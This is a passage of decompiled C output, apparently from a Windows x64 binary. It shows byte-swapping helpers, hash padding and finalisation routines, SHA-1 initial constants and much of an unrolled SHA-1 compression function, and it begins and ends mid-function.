    if ( v3 >= 8 && dword_1400D8200 >= 2 && (a1 > a2 - 4 + 4 * v3 || a1 - 4 + 4 * v3 < a2) )
    {
      v5 = a2 + 16;
      v6 = a1 - a2;
      do
      {
        v7 = _mm_loadu_si128((const __m128i *)(v5 - 16));
        v4 += 8i64;
        v5 += 32i64;
        _mm_storeu_si128((__m128i *)(v6 + v5 - 48), _mm_shuffle_epi8(v7, (__m128i)xmmword_1400AD230));
        _mm_storeu_si128(
          (__m128i *)(v6 + v5 - 32),
          _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v5 - 32)), (__m128i)xmmword_1400AD230));
      }
      while ( v4 < v3 - (v3 & 7) );
    }
    if ( v4 < v3 )
    {
      v8 = a2 - a1;
      v9 = a1 + 4 * v4;
      v10 = v3 - v4;
      do
      {
        v11 = *(_DWORD *)(v8 + v9);
        v9 += 4i64;
        *(_DWORD *)(v9 - 4) = _byteswap_ulong(v11);
        --v10;
      }
      while ( v10 );
    }
  }
}
// 1400AD230: using guessed type __int128 xmmword_1400AD230;
// 1400D8200: using guessed type int dword_1400D8200;

//----- (0000000140061610) ----------------------------------------------------
__int64 __fastcall sub_140061610(_DWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rdi
  _DWORD *v3; // rsi
  int v4; // eax
  unsigned int v5; // ebx

  v2 = a2;
  v3 = a1;
  v4 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 64i64))();
  v5 = v3[2] & (v4 - 1);
  *v2 = v4 - v5;
  return v5 + (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v3 + 176i64))(v3);
}

//----- (0000000140061660) ----------------------------------------------------
unsigned __int64 __fastcall sub_140061660(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbp
  unsigned __int64 v4; // rdi
  __int64 *v5; // rsi
  unsigned int v6; // ebx
  unsigned __int64 v7; // r13
  unsigned __int64 v8; // r15
  unsigned __int64 v9; // r12
  signed __int64 v10; // rax
  signed __int64 v11; // r13
  unsigned __int64 v12; // rbx
  __int64 v13; // rax
  __int64 *v14; // rcx
  unsigned __int64 v15; // rdx
  unsigned int v16; // eax
  unsigned __int64 v17; // rdx
  unsigned __int64 v18; // rax
  signed __int64 v19; // rcx
  __m128i v20; // xmm0
  signed __int64 v21; // r8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rcx
  bool v25; // [rsp+60h] [rbp+8h]
  signed __int64 v26; // [rsp+68h] [rbp+10h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (**)(void))(*a1 + 64))();
  v25 = (*(unsigned int (__fastcall **)(__int64 *))(*v5 + 152))(v5) == 0;
  v7 = (unsigned __int64)v6 >> 2;
  v8 = (*(__int64 (__fastcall **)(__int64 *))(*v5 + 176))(v5);
  v9 = v6;
  v10 = 4 * v7;
  v11 = -4i64 * v7;
  v12 = v8 - v4;
  v26 = v10;
  do
  {
    v13 = *v5;
    v14 = v5;
    if ( v25 )
    {
      v15 = v4;
    }
    else
    {
      v16 = (*(__int64 (__fastcall **)(__int64 *))(v13 + 64))(v5);
      v17 = 0i64;
      v18 = (unsigned __int64)v16 >> 2;
      if ( v18 )
      {
        if ( v18 >= 8 && dword_1400D8200 >= 2 && (v8 > v4 + 4 * (v18 - 1) || v8 + 4 * (v18 - 1) < v4) )
        {
          v19 = v4 + 16;
          do
          {
            v20 = _mm_loadu_si128((const __m128i *)(v19 - 16));
            v17 += 8i64;
            v19 += 32i64;
            _mm_storeu_si128((__m128i *)(v12 + v19 - 48), _mm_shuffle_epi8(v20, (__m128i)xmmword_1400AD230));
            _mm_storeu_si128(
              (__m128i *)(v12 + v19 - 32),
              _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)(v19 - 32)), (__m128i)xmmword_1400AD230));
          }
          while ( v17 < v18 - (v18 & 7) );
        }
        if ( v17 < v18 )
        {
          v21 = v8 + 4 * v17;
          v22 = v18 - v17;
          do
          {
            v23 = v21 - v8;
            v21 += 4i64;
            *(_DWORD *)(v21 - 4) = _byteswap_ulong(*(_DWORD *)(v23 + v4));
            --v22;
          }
          while ( v22 );
        }
      }
      v13 = *v5;
      v15 = v8;
      v14 = v5;
    }
    (*(void (__fastcall **)(__int64 *, unsigned __int64))(v13 + 160))(v14, v15);
    v4 += v26;
    v3 -= v9;
    v12 += v11;
  }
  while ( v3 >= v9 );
  return v3;
}
// 1400AD230: using guessed type __int128 xmmword_1400AD230;
// 1400D8200: using guessed type int dword_1400D8200;

//----- (00000001400617E0) ----------------------------------------------------
void *__fastcall sub_1400617E0(_DWORD *a1, unsigned int a2, char a3)
{
  char v3; // bl
  size_t v4; // rsi
  _DWORD *v5; // r14
  int v6; // er15
  __int64 v7; // rdi
  __int64 v8; // rax
  unsigned int v9; // edi
  void *v10; // rbp
  void *v11; // rcx
  size_t v12; // r8
  __int64 v13; // rbx
  unsigned int v14; // eax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 64i64))();
  v7 = v5[2] & (unsigned int)(v6 - 1);
  v8 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 176i64))(v5);
  *(_BYTE *)(v7 + v8) = v3;
  v9 = v7 + 1;
  v10 = (void *)v8;
  v11 = (void *)(v8 + v9);
  if ( v9 > (unsigned int)v4 )
  {
    memset(v11, 0, v6 - v9);
    v13 = *(_QWORD *)v5;
    v14 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 64i64))(v5);
    (*(void (__fastcall **)(_DWORD *, void *, _QWORD))(v13 + 168))(v5, v10, v14);
    v12 = v4;
    v11 = v10;
  }
  else
  {
    v12 = (unsigned int)v4 - v9;
  }
  return memset(v11, 0, v12);
}

//----- (0000000140061880) ----------------------------------------------------
__int64 __fastcall sub_140061880(_QWORD *a1)
{
  a1[1] = 0i64;
  return (*(__int64 (**)(void))(*a1 + 144i64))();
}

//----- (0000000140061890) ----------------------------------------------------
__int64 __fastcall sub_140061890(__int64 a1, void *a2, unsigned __int64 a3)
{
  void *v3; // r14
  size_t v4; // rbp
  _DWORD *v5; // rdi
  __int64 v6; // r12
  const void *v7; // rsi
  unsigned __int64 v8; // rbx
  __int64 v9; // r15
  unsigned int v10; // ecx
  unsigned int v11; // edx
  __int64 v12; // rbx
  unsigned int v13; // eax
  unsigned __int64 v14; // r8

  v3 = a2;
  v4 = a3;
  v5 = (_DWORD *)a1;
  sub_140039810(a1, a3);
  v6 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 176i64))(v5);
  v7 = (const void *)(*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 184i64))(v5);
  v8 = (*(unsigned int (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 64i64))(v5);
  v9 = (*(signed int (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 152i64))(v5);
  sub_1400617E0(v5, v8 - 8, 128);
  v10 = 8 * v5[2];
  if ( (_DWORD)v9 )
    v10 = _byteswap_ulong(v10);
  *(_DWORD *)(v6 + 4 * (v9 + (v8 >> 2)) - 8) = v10;
  v11 = (v5[2] >> 29) + 8 * v5[3];
  if ( (_DWORD)v9 )
    v11 = _byteswap_ulong(v11);
  *(_DWORD *)(v6 + 4 * ((v8 >> 2) - v9) - 4) = v11;
  v12 = *(_QWORD *)v5;
  v13 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 64i64))(v5);
  (*(void (__fastcall **)(_DWORD *, __int64, _QWORD))(v12 + 168))(v5, v6, v13);
  if ( v4 & 3 )
  {
    v14 = (*(unsigned int (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 56i64))(v5);
    if ( (_DWORD)v9 )
      sub_140061550((unsigned __int64)v7, (unsigned __int64)v7, v14);
    memcpy(v3, v7, v4);
  }
  else if ( (_DWORD)v9 )
  {
    sub_140061550((unsigned __int64)v3, (unsigned __int64)v7, v4);
  }
  else if ( v7 != v3 )
  {
    memcpy_s(v3, v4, v7, v4);
  }
  return (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v5 + 48i64))(v5);
}

//----- (0000000140061C20) ----------------------------------------------------
__int64 __fastcall sub_140061C20(__int64 a1, unsigned __int64 *a2, __int64 a3)
{
  char v3; // bl

  v3 = a3;
  sub_1400639D0(*(const __m128i **)(a1 + 192), a2, a3 & 0xFFFFFFFFFFFFFFC0ui64);
  return v3 & 0x3F;
}

//----- (0000000140061C50) ----------------------------------------------------
void __fastcall sub_140061C50(_DWORD *a1)
{
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  a1[4] = -1009589776;
}

//----- (0000000140061C80) ----------------------------------------------------
void __fastcall sub_140061C80(_OWORD *a1)
{
  *a1 = xmmword_1400AD5C0;
  a1[1] = xmmword_1400AD5D0;
}
// 1400AD5C0: using guessed type __int128 xmmword_1400AD5C0;
// 1400AD5D0: using guessed type __int128 xmmword_1400AD5D0;

//----- (0000000140061CA0) ----------------------------------------------------
__int64 __fastcall sub_140061CA0(_DWORD *a1, _DWORD *a2)
{
  int v2; // ebp
  int v3; // er10
  int v4; // er11
  int v5; // edi
  _DWORD *v6; // rbx
  int v7; // er14
  int v8; // er15
  int v9; // er12
  int v10; // er13
  int v11; // ST28_4
  int v12; // edx
  int v13; // er9
  int v14; // er8
  int v15; // er10
  int v16; // er11
  int v17; // ebp
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  int v21; // er8
  int v22; // er9
  int v23; // er10
  int v24; // ST08_4
  int v25; // ecx
  int v26; // ST18_4
  int v27; // er11
  int v28; // ecx
  int v29; // edx
  int v30; // ST2C_4
  int v31; // ecx
  int v32; // ST24_4
  int v33; // er8
  int v34; // ecx
  int v35; // ST10_4
  int v36; // er9
  int v37; // ST1C_4
  int v38; // er10
  int v39; // ecx
  int v40; // ST00_4
  int v41; // er11
  int v42; // ecx
  int v43; // esi
  int v44; // eax
  int v45; // edx
  int v46; // er8
  int v47; // ecx
  int v48; // er9
  int v49; // ST14_4
  int v50; // er9
  unsigned int v51; // er10
  int v52; // er10
  unsigned int v53; // er11
  int v54; // ST04_4
  int v55; // eax
  unsigned int v56; // ecx
  int v57; // er11
  int v58; // edx
  int v59; // ST0C_4
  int v60; // edx
  int v61; // ecx
  int v62; // er8
  int v63; // ST30_4
  int v64; // edi
  int v65; // er8
  int v66; // ecx
  int v67; // er9
  int v68; // esi
  int v69; // ecx
  int v70; // er10
  int v71; // ecx
  int v72; // er11
  int v73; // ebp
  int v74; // ecx
  int v75; // edx
  int v76; // ecx
  int v77; // ST08_4
  int v78; // er8
  int v79; // ecx
  int v80; // ST20_4
  int v81; // er12
  int v82; // er9
  int v83; // ST00_4
  int v84; // ecx
  int v85; // er10
  int v86; // ecx
  int v87; // er14
  int v88; // ST28_4
  int v89; // er11
  int v90; // ecx
  int v91; // ST18_4
  int v92; // edx
  int v93; // ecx
  int v94; // er8
  int v95; // ecx
  int v96; // er9
  int v97; // er12
  int v98; // ecx
  int v99; // ST2C_4
  int v100; // er10
  int v101; // ecx
  int v102; // er11
  int v103; // ecx
  int v104; // er15
  int v105; // ST10_4
  int v106; // edx
  int v107; // ecx
  int v108; // ST00_4
  int v109; // er8
  int v110; // ST04_4
  int v111; // er9
  int v112; // ecx
  unsigned int v113; // eax
  int v114; // er15
  int v115; // ST1C_4
  int v116; // er10
  int v117; // ecx
  int v118; // ST24_4
  int v119; // er11
  unsigned int v120; // edi
  int v121; // ST14_4
  int v122; // ST08_4
  int v123; // eax
  int v124; // er15
  int v125; // ecx
  int v126; // er8
  unsigned int v127; // ecx
  unsigned int v128; // eax
  int v129; // edi
  int v130; // er9
  int v131; // ST0C_4
  unsigned int v132; // eax
  unsigned int v133; // ecx
  int v134; // ecx
  int v135; // eax
  int v136; // er12
  int v137; // er10
  int v138; // ST00_4
  unsigned int v139; // ecx
  int v140; // er14
  int v141; // er11
  int v142; // ST04_4
  int v143; // ecx
  int v144; // ST20_4
  int v145; // ecx
  int v146; // eax
  int v147; // er8
  unsigned int v148; // ecx
  unsigned int v149; // eax
  int v150; // er9
  unsigned int v151; // ecx
  int v152; // er10
  unsigned int v153; // ecx
  int v154; // ST30_4
  int v155; // er11
  int v156; // ST10_4
  int v157; // ecx
  int v158; // esi
  int v159; // er13
  int v160; // ecx
  int v161; // edi
  unsigned int v162; // eax
  int v163; // er15
  int v164; // er14
  int v165; // ST1C_4
  int v166; // ST2C_4
  int v167; // ST18_4
  int v168; // er8
  unsigned int v169; // ecx
  int v170; // ecx
  unsigned int v171; // eax
  int v172; // er9
  unsigned int v173; // ecx
  int v174; // er10
  unsigned int v175; // er11
  int v176; // eax
  int v177; // ecx
  int v178; // ST08_4
  int v179; // esi
  int v180; // edi
  int v181; // ST34_4
  int v182; // ecx
  int v183; // er8
  int v184; // ecx
  int v185; // er9
  int v186; // ST24_4
  unsigned int v187; // ecx
  int v188; // er10
  int v189; // er12
  int v190; // edx
  int v191; // er15
  int v192; // ST00_4
  unsigned int v193; // ecx
  int v194; // ST0C_4
  int v195; // eax
  int v196; // er11
  int v197; // ST14_4
  unsigned int v198; // ecx
  int v199; // er8
  int v200; // ecx
  int v201; // eax
  int v202; // er8
  int v203; // ST04_4
  int v204; // edx
  int v205; // er9
  int v206; // er10
  int v207; // eax
  int v208; // esi
  int v209; // edi
  int v210; // er11
  int v211; // ST10_4
  int v212; // eax
  int v213; // ST30_4
  int v214; // er13
  int v215; // er8
  int v216; // edx
  int v217; // er9
  int v218; // er10
  int v219; // eax
  int v220; // esi
  int v221; // er15
  int v222; // er11
  int v223; // eax
  int v224; // ST34_4
  int v225; // er12
  int v226; // ST28_4
  int v227; // er8
  int v228; // eax
  int v229; // eax
  int v230; // edx
  int v231; // er14
  unsigned int v232; // eax
  int v233; // ebp
  int v234; // er9
  unsigned int v235; // eax
  int v236; // esi
  int v237; // er10
  unsigned int v238; // eax
  int v239; // edi
  int v240; // er8
  int v241; // eax
  int v242; // edx
  int v243; // eax
  int v244; // er11
  int v245; // er9
  int v246; // eax
  int v247; // er9
  unsigned int v248; // eax
  _DWORD *v249; // r10
  int v250; // er8
  unsigned int v251; // ecx
  __int64 result; // rax
  _DWORD *v253; // [rsp+90h] [rbp+8h]
  int v254; // [rsp+98h] [rbp+10h]
  int v255; // [rsp+98h] [rbp+10h]
  int v256; // [rsp+98h] [rbp+10h]
  int v257; // [rsp+98h] [rbp+10h]
  int v258; // [rsp+A0h] [rbp+18h]
  int v259; // [rsp+A0h] [rbp+18h]
  int v260; // [rsp+A0h] [rbp+18h]
  int v261; // [rsp+A0h] [rbp+18h]
  int v262; // [rsp+A8h] [rbp+20h]
  int v263; // [rsp+A8h] [rbp+20h]
  int v264; // [rsp+A8h] [rbp+20h]
  int v265; // [rsp+A8h] [rbp+20h]

  v253 = a1;
  v2 = a1[2];
  v3 = a1[1];
  v4 = a1[3];
  v5 = *a2;
  v6 = a2;
  v7 = a2[2];
  v8 = a2[3];
  v9 = a2[4];
  v10 = a2[6];
  v11 = a2[1];
  v12 = __ROL4__(v3, 30);
  v13 = a1[4] + __ROL4__(*a1, 5) + (v4 ^ v3 & (v2 ^ a1[3])) + v5 + 1518500249;
  v14 = __ROL4__(*a1, 30);
  v15 = v4 + 1518500249 + v11 + __ROL4__(v13, 5) + (v2 ^ *a1 & (__ROL4__(v3, 30) ^ v2));
  v16 = v2 + 1518500249 + v7 + __ROL4__(v15, 5) + (v12 ^ v13 & (v14 ^ v12));
  v13 = __ROL4__(v13, 30);
  v17 = v6[5];
  v18 = v14 ^ v15 & (v14 ^ v13);
  v15 = __ROL4__(v15, 30);
  v19 = v8 + __ROL4__(v16, 5) + v18 + v12 + 1518500249;
  v20 = v13 ^ v16 & (v15 ^ v13);
  v16 = __ROL4__(v16, 30);
  v21 = v9 + __ROL4__(v19, 5) + v20 + v14 + 1518500249;
  v22 = v17 + __ROL4__(v21, 5) + 1518500249 + (v15 ^ v19 & (v16 ^ v15)) + v13;
  v19 = __ROL4__(v19, 30);
  v23 = v10 + __ROL4__(v22, 5) + 1518500249 + (v16 ^ v21 & (v19 ^ v16)) + v15;
  v24 = v6[7];
  v21 = __ROL4__(v21, 30);
  v25 = v19 ^ v22 & (v21 ^ v19);
  v26 = v6[8];
  v22 = __ROL4__(v22, 30);
  v27 = v6[7] + 1518500249 + __ROL4__(v23, 5) + v25 + v16;
  v28 = v26 + 1518500249 + __ROL4__(v27, 5) + (v21 ^ v23 & (v21 ^ v22));
  v23 = __ROL4__(v23, 30);
  v29 = v28 + v19;
  v30 = v6[9];
  v31 = v6[9] + 1518500249 + __ROL4__(v29, 5) + (v22 ^ v27 & (v23 ^ v22));
  v32 = v6[10];
  v27 = __ROL4__(v27, 30);
  v33 = v31 + v21;
  v34 = v23 ^ v29 & (v27 ^ v23);
  v29 = __ROL4__(v29, 30);
  v35 = v6[11];
  v36 = v32 + 1518500249 + __ROL4__(v33, 5) + v34 + v22;
  v37 = v6[12];
  v38 = v35 + 1518500249 + __ROL4__(v36, 5) + (v27 ^ v33 & (v29 ^ v27)) + v23;
  v33 = __ROL4__(v33, 30);
  v39 = v36 & (v33 ^ v29);
  v36 = __ROL4__(v36, 30);
  v40 = v6[13];
  v41 = v37 + 1518500249 + __ROL4__(v38, 5) + (v29 ^ v39) + v27;
  v42 = v33 ^ v38 & (v33 ^ v36);
  v43 = v6[14];
  v38 = __ROL4__(v38, 30);
  v44 = v6[14];
  LODWORD(v6) = v6[15];
  v45 = v40 + 1518500249 + __ROL4__(v41, 5) + v42 + v29;
  v258 = v44;
  v254 = (signed int)v6;
  v46 = v43 + 1518500249 + __ROL4__(v45, 5) + (v36 ^ v41 & (v38 ^ v36)) + v33;
  v41 = __ROL4__(v41, 30);
  LODWORD(v6) = (v38 ^ v45 & (v41 ^ v38)) + __ROL4__(v46, 5) + (_DWORD)v6;
  v45 = __ROL4__(v45, 30);
  LODWORD(v6) = v36 + 1518500249 + (_DWORD)v6;
  v47 = v46 & (v45 ^ v41);
  v46 = __ROL4__(v46, 30);
  v48 = __ROL4__(v5 ^ v7 ^ v26 ^ v40, 1);
  v262 = v48;
  v49 = __ROL4__(v11 ^ v8 ^ v30 ^ v44, 1);
  v50 = v38 + 1518500249 + (v41 ^ v47) + __ROL4__((_DWORD)v6, 5) + v48;
  v51 = v49 + __ROL4__(v50, 5) + (v45 ^ (unsigned int)v6 & (v46 ^ v45));
  LODWORD(v6) = __ROL4__((_DWORD)v6, 30);
  v52 = v41 + 1518500249 + v51;
  v53 = v46 ^ v50 & (v46 ^ (unsigned int)v6);
  v54 = __ROL4__(v7 ^ v9 ^ v32 ^ v254, 1);
  v50 = __ROL4__(v50, 30);
  v55 = v54 + __ROL4__(v52, 5);
  v56 = (unsigned int)v6 ^ v52 & (v50 ^ (unsigned int)v6);
  v52 = __ROL4__(v52, 30);
  v57 = v45 + 1518500249 + v55 + v53;
  v58 = __ROL4__(v262 ^ v8 ^ v17 ^ v35, 1);
  v59 = v58;
  v60 = v46 + 1518500249 + v56 + __ROL4__(v57, 5) + v58;
  v61 = (v57 ^ v52 ^ v50) + 1859775393;
  v57 = __ROL4__(v57, 30);
  v62 = __ROL4__(v49 ^ v9 ^ v10 ^ v37, 1);
  v63 = v62;
  v64 = __ROL4__(v54 ^ v17 ^ v24 ^ v40, 1);
  v65 = (_DWORD)v6 + v61 + __ROL4__(v60, 5) + v62;
  v66 = v60 ^ v57 ^ v52;
  v60 = __ROL4__(v60, 30);
  v67 = v64 + 1859775393 + __ROL4__(v65, 5) + v66 + v50;
  v68 = __ROL4__(v59 ^ v10 ^ v26 ^ v258, 1);
  v69 = v57 ^ v65;
  v65 = __ROL4__(v65, 30);
  v70 = v68 + __ROL4__(v67, 5) + 1859775393 + (v60 ^ v69) + v52;
  v71 = v60 ^ v67 ^ v65;
  LODWORD(v6) = __ROL4__(v63 ^ v24 ^ v30 ^ v254, 1);
  v67 = __ROL4__(v67, 30);
  v72 = (_DWORD)v6 + 1859775393 + __ROL4__(v70, 5) + v71 + v57;
  v73 = __ROL4__(v262 ^ v64 ^ v26 ^ v32, 1);
  v74 = v73 + __ROL4__(v72, 5) + 1859775393 + (v70 ^ v67 ^ v65);
  v70 = __ROL4__(v70, 30);
  v75 = v74 + v60;
  v76 = v72 ^ v70 ^ v67;
  v77 = __ROL4__(v49 ^ v68 ^ v30 ^ v35, 1);
  v72 = __ROL4__(v72, 30);
  v78 = v77 + 1859775393 + __ROL4__(v75, 5) + v76 + v65;
  v79 = v75 ^ v72 ^ v70;
  v75 = __ROL4__(v75, 30);
  v80 = __ROL4__(v54 ^ (unsigned int)v6 ^ v32 ^ v37, 1);
  v81 = v40;
  v82 = v80 + 1859775393 + __ROL4__(v78, 5) + v79 + v67;
  v83 = __ROL4__(v59 ^ v73 ^ v35 ^ v40, 1);
  v84 = v78;
  v78 = __ROL4__(v78, 30);
  v85 = v83 + 1859775393 + __ROL4__(v82, 5) + (v75 ^ v72 ^ v84) + v70;
  v86 = v75 ^ v82 ^ v78;
  v82 = __ROL4__(v82, 30);
  v87 = __ROL4__(v63 ^ v77 ^ v37 ^ v258, 1);
  v88 = __ROL4__(v63 ^ v77 ^ v37 ^ v258, 1);
  v89 = v87 + __ROL4__(v85, 5) + 1859775393 + v86 + v72;
  v90 = v85 ^ v82 ^ v78;
  v91 = __ROL4__(v64 ^ v80 ^ v81 ^ v254, 1);
  v85 = __ROL4__(v85, 30);
  v92 = v91 + __ROL4__(v89, 5) + 1859775393 + v90 + v75;
  v93 = v89 ^ v85 ^ v82;
  v259 = __ROL4__(v262 ^ v68 ^ v83 ^ v258, 1);
  v89 = __ROL4__(v89, 30);
  v94 = v259 + 1859775393 + __ROL4__(v92, 5) + v93 + v78;
  v95 = v92 ^ v89 ^ v85;
  v92 = __ROL4__(v92, 30);
  v255 = __ROL4__(v49 ^ (unsigned int)v6 ^ v87 ^ v254, 1);
  v96 = v255 + 1859775393 + __ROL4__(v94, 5) + v95 + v82;
  v97 = v83;
  v98 = v89 ^ v94;
  v99 = __ROL4__(v262 ^ v54 ^ v73 ^ v91, 1);
  v94 = __ROL4__(v94, 30);
  v100 = v99 + __ROL4__(v96, 5) + 1859775393 + (v92 ^ v98) + v85;
  v101 = v96 ^ v94;
  v96 = __ROL4__(v96, 30);
  v263 = __ROL4__(v49 ^ v59 ^ v77 ^ v259, 1);
  v102 = v263 + 1859775393 + __ROL4__(v100, 5) + (v92 ^ v101) + v89;
  v103 = v100 ^ v96 ^ v94;
  v104 = __ROL4__(v54 ^ v63 ^ v80 ^ v255, 1);
  v105 = __ROL4__(v54 ^ v63 ^ v80 ^ v255, 1);
  v100 = __ROL4__(v100, 30);
  v106 = v104 + __ROL4__(v102, 5) + 1859775393 + v103 + v92;
  v107 = v102 ^ v100 ^ v96;
  v108 = __ROL4__(v99 ^ v59 ^ v64 ^ v83, 1);
  v102 = __ROL4__(v102, 30);
  v109 = v108 + 1859775393 + __ROL4__(v106, 5) + v107 + v94;
  v110 = __ROL4__(v263 ^ v63 ^ v68 ^ v88, 1);
  v111 = v110 + 1859775393 + __ROL4__(v109, 5) + (v106 ^ v102 ^ v100) + v96;
  v106 = __ROL4__(v106, 30);
  v112 = v109;
  v109 = __ROL4__(v109, 30);
  v113 = v104 ^ v64 ^ (unsigned int)v6 ^ v91;
  v114 = v77;
  v115 = __ROL4__(v113, 1);
  v116 = __ROL4__(v113, 1) + 1859775393 + __ROL4__(v111, 5) + (v106 ^ v102 ^ v112) + v100;
  v117 = v106 ^ v111 ^ v109;
  v118 = __ROL4__(v108 ^ v68 ^ v73 ^ v259, 1);
  v111 = __ROL4__(v111, 30);
  v119 = v118 + 1859775393 + __ROL4__(v116, 5) + v117 + v102;
  v120 = (unsigned int)v6 ^ v77 ^ v255;
  LODWORD(v6) = v116 ^ v111 ^ v109;
  v121 = __ROL4__(v110 ^ v120, 1);
  v116 = __ROL4__(v116, 30);
  LODWORD(v6) = v106 + 1859775393 + v121 + __ROL4__(v119, 5) + (_DWORD)v6;
  v122 = __ROL4__(v99 ^ __ROL4__(v113, 1) ^ v73 ^ v80, 1);
  v123 = v114 ^ v97;
  v124 = v263;
  v125 = v109 + v122 + (v119 & v116 | v111 & (v119 | v116));
  v119 = __ROL4__(v119, 30);
  v126 = v125 + __ROL4__((_DWORD)v6, 5) - 1894007588;
  v264 = __ROL4__(v263 ^ v118 ^ v123, 1);
  v127 = v116 & ((unsigned int)v6 | v119);
  v128 = (unsigned int)v6 & v119;
  LODWORD(v6) = __ROL4__((_DWORD)v6, 30);
  v129 = v105;
  v130 = v111 + v264 + (v128 | v127) + __ROL4__(v126, 5) - 1894007588;
  v131 = __ROL4__(v105 ^ v121 ^ v80 ^ v88, 1);
  v132 = (unsigned int)v6 & v126;
  v133 = v119 & ((unsigned int)v6 | v126);
  v126 = __ROL4__(v126, 30);
  v134 = v132 | v133;
  v135 = v97 ^ v91;
  v136 = v108;
  v137 = v116 + v131 + v134 + __ROL4__(v130, 5) - 1894007588;
  v138 = __ROL4__(v108 ^ v122 ^ v135, 1);
  v139 = v130 & v126 | (unsigned int)v6 & (v130 | v126);
  v130 = __ROL4__(v130, 30);
  v140 = v110;
  v141 = v119 + v138 + v139 + __ROL4__(v137, 5) - 1894007588;
  v142 = __ROL4__(v110 ^ v264 ^ v88 ^ v259, 1);
  v143 = v142 + (v137 & v130 | v126 & (v137 | v130));
  v137 = __ROL4__(v137, 30);
  LODWORD(v6) = (_DWORD)v6 + v143 + __ROL4__(v141, 5) - 1894007588;
  v144 = __ROL4__(v115 ^ v131 ^ v91 ^ v255, 1);
  v145 = v130 & (v141 | v137);
  v146 = v141 & v137;
  v141 = __ROL4__(v141, 30);
  v256 = __ROL4__(v124 ^ v121 ^ v142 ^ v255, 1);
  v147 = v126 + v144 + (v146 | v145) + __ROL4__((_DWORD)v6, 5) - 1894007588;
  v260 = __ROL4__(v99 ^ v118 ^ v138 ^ v259, 1);
  v148 = v137 & ((unsigned int)v6 | v141);
  v149 = (unsigned int)v6 & v141;
  LODWORD(v6) = __ROL4__((_DWORD)v6, 30);
  v150 = v130 + v260 + (v149 | v148) + __ROL4__(v147, 5) - 1894007588;
  v151 = v256 + ((unsigned int)v6 & v147 | v141 & ((unsigned int)v6 | v147));
  v147 = __ROL4__(v147, 30);
  v152 = v137 + v151 + __ROL4__(v150, 5) - 1894007588;
  v153 = __ROL4__(v99 ^ v105 ^ v122 ^ v144, 1) + (v150 & v147 | (unsigned int)v6 & (v150 | v147));
  v154 = __ROL4__(v99 ^ v105 ^ v122 ^ v144, 1);
  v150 = __ROL4__(v150, 30);
  v155 = v141 + v153 + __ROL4__(v152, 5) - 1894007588;
  v156 = __ROL4__(v124 ^ v136 ^ v264 ^ v260, 1);
  v157 = (_DWORD)v6 + v156 + (v152 & v150 | v147 & (v152 | v150));
  v152 = __ROL4__(v152, 30);
  LODWORD(v6) = v157 + __ROL4__(v155, 5) - 1894007588;
  v158 = __ROL4__(v129 ^ v140 ^ v131 ^ v256, 1);
  v159 = v122;
  v160 = v158 + (v155 & v152 | v150 & (v155 | v152));
  v155 = __ROL4__(v155, 30);
  v161 = __ROL4__(v154 ^ v136 ^ v115 ^ v138, 1);
  v162 = (unsigned int)v6 & v155;
  v163 = v156 ^ v140 ^ v118 ^ v142;
  v164 = v158 ^ v115 ^ v121 ^ v144;
  v165 = v158;
  v166 = v161;
  v167 = __ROL4__(v163, 1);
  v168 = v147 + v160 + __ROL4__((_DWORD)v6, 5) - 1894007588;
  v169 = (unsigned int)v6 | v155;
  LODWORD(v6) = __ROL4__((_DWORD)v6, 30);
  v170 = v162 | v152 & v169;
  v171 = (unsigned int)v6 & v168;
  v172 = v150 + v161 + v170 + __ROL4__(v168, 5) - 1894007588;
  v173 = (unsigned int)v6 | v168;
  v168 = __ROL4__(v168, 30);
  v174 = v152 + __ROL4__(v163, 1) + (v171 | v155 & v173) + __ROL4__(v172, 5) - 1894007588;
  v175 = __ROL4__(v174, 5) + __ROL4__(v164, 1) + (v172 & v168 | (unsigned int)v6 & (v172 | v168)) - 1894007588 + v155;
  v172 = __ROL4__(v172, 30);
  v176 = v174 & v172;
  v177 = v168 & (v174 | v172);
  v174 = __ROL4__(v174, 30);
  v178 = __ROL4__(v161 ^ v118 ^ v122 ^ v260, 1);
  v179 = __ROL4__(__ROL4__(v163, 1) ^ v121 ^ v264 ^ v256, 1);
  v180 = (_DWORD)v6 - 1894007588 + v178 + (v176 | v177) + __ROL4__(v175, 5);
  v181 = __ROL4__(__ROL4__(v163, 1) ^ v121 ^ v264 ^ v256, 1);
  v182 = v179 + (v175 & v174 | v172 & (v175 | v174));
  v175 = __ROL4__(v175, 30);
  LODWORD(v6) = v168 - 1894007588 + v182 + __ROL4__(v180, 5);
  v183 = __ROL4__(v154 ^ __ROL4__(v164, 1) ^ v159 ^ v131, 1);
  v184 = v180 & v175 | v174 & (v180 | v175);
  v180 = __ROL4__(v180, 30);
  v185 = v172 + v183 + v184 + __ROL4__((_DWORD)v6, 5) - 1894007588;
  v186 = __ROL4__(v154 ^ __ROL4__(v164, 1) ^ v159 ^ v131, 1);
  v265 = __ROL4__(v156 ^ v178 ^ v264 ^ v138, 1);
  v187 = v174 + v265 + (v180 & (unsigned int)v6 | v175 & (v180 | (unsigned int)v6));
  LODWORD(v6) = __ROL4__((_DWORD)v6, 30);
  v188 = v187 + __ROL4__(v185, 5) - 1894007588;
  v189 = __ROL4__(v165 ^ v179 ^ v131 ^ v142, 1);
  v190 = v187 + __ROL4__(v185, 5) - 1894007588;
